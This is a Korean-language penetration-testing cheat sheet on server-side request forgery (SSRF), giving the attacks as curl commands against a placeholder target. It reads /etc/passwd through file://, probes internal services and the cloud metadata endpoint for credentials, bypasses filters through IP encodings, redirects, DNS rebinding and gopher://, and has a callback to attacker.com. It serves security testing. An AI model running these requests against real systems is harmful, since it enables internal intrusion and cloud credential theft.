# SSRF — 서버 측 요청 위조

- SSRF(Server-Side Request Forgery) — 서버가 사용자 입력을 URL로 만들어 내부망이나 로컬 리소스로 요청하게 만드는 취약점. 공격자는 서버 입장에서 내부 서비스에 접근한다.
- URL·웹훅·이미지 프록시·문서 변환 같은 "서버가 대신 fetch하는" 기능에서 내부망 포트 스캔, 클라우드 메타데이터 획득, file:// 읽기를 시험할 때.
- 서버가 요청을 대신 보내주는 파라미터(url=, src=, fetch=, redirect=)와 응답·에러로 결과를 구분할 수단(차이 나는 응답, 지연 시간)이 필요하다.

## 취약한 패턴

```text
http://target.com/fetch?url=http://internal-host
http://target.com/avatar?src=http://cdn.example.com/img.png
http://target.com/webhook?callback=http://attacker.com
POST body: {"url": "http://...", "timeout": 5}
```

- 파라미터 값이 다른 호스트로 바뀌어도 응답이 달라지면 서버가 요청을 프록시하는 것이다. 여기서 SSRF 후보로 판정한다.

## 기본 테스트

```bash
# 1) 외부 서버로 요청 전환 — 서버가 실제로 fetch하는지 확인
curl "http://target.com/fetch?url=http://10.10.10.10/"

# 2) 내부 루프백 — 서버 자신을 향한 요청
curl "http://target.com/fetch?url=http://127.0.0.1/"
curl "http://target.com/fetch?url=http://localhost:8080/"

# 3) file:// 스킴 — 파일 읽기 (라이브러리가 허용할 때)
curl "http://target.com/fetch?url=file:///etc/passwd"
```

- 성공 판정: 응답에 외부 서버 내용이 반영되거나, 내부 서비스의 배너(예: 내부 admin 페이지)가 나온다. 지연 시간 차이로도 포트 개폐를 판별할 수 있다.

## 내부망 열거

```bash
# 내부 IP 대역 포트 확인 (응답 시간·에러 메시지 차이로 판별)
curl -o /dev/null -s -w "%{http_code} %{time_total}\n" \
  "http://target.com/fetch?url=http://10.0.0.5:6379/"
```

```text
자주 노리는 내부 대상
169.254.169.254   클라우드 메타데이터 (AWS/GCP/Azure)
127.0.0.1:6379    Redis
127.0.0.1:3306    MySQL
127.0.0.1:9200    Elasticsearch
10.x.x.x          내부 서비스 대역
```

- 클라우드 환경이면 메타데이터(AWS IMDSv1)에서 크리덴셜이 나온다: `http://169.254.169.254/latest/meta-data/`

## 필터 우회

```text
localhost 차단 시
  127.0.0.1      -> 0x7f000001 (16진수), 2130706433 (10진수), 0177.0.0.1 (8진수)
  localhost      -> 0.0.0.0, [::1], 127.1
호스트 검증 우회
  리다이렉트     -> 외부 서버에서 302로 내부 주소로 리다이렉트
  DNS 리바인딩   -> 짧은 TTL로 내부 IP를 가리키는 도메인
스킴 혼합
  gopher://      -> Redis·SMTP 등에 원시 패킷 전송 (지원 라이브러리 한정)
  dict://        -> 포트 배너 수집
```

- 302 리다이렉트 우회가 가장 실용적이다. 공격자 서버(python3 -m http.server + 간단한 302)를 하나 띄워두면 된다.

## 응답 기반 판정 (블라인드 SSRF)

```bash
# 직접 응답이 안 보이면 공격자 서버로 콜백을 유도한다
curl "http://target.com/fetch?url=http://10.10.10.10:8000/callback"
# python3 -m http.server 8000 로 띄워둔 서버의 접근 로그에 GET /callback 이 찍히면 성공
```

- 응답에 내용이 안 나와도 콜백이 도착하면 SSRF는 성립한다. 내용 반영 여부만 다른 문제다.

## 트러블슈팅

- url 파라미터에 아무 반응이 없으면 그 값이 서버 요청에 안 쓰이는 것일 수 있다. Burp로 파라미터 후보(arjun 결과 등)를 다시 검토한다.
- 에러 메시지에 `Connection refused`·`timed out`이 구분돼 보이면 포트 스캔 오라클로 쓸 수 있다. 반응이 전부 같으면 시간 측정으로 판별한다.
- 내부 대역이 필터돼 있으면 리다이렉트·DNS 리바인딩·IP 표기법 우회를 순서대로 시험한다.
- 심화 문서: web/ssrf/ssrf.md (실습), recon/curl/vulnerability-tests.md (curl 테스트 모음)
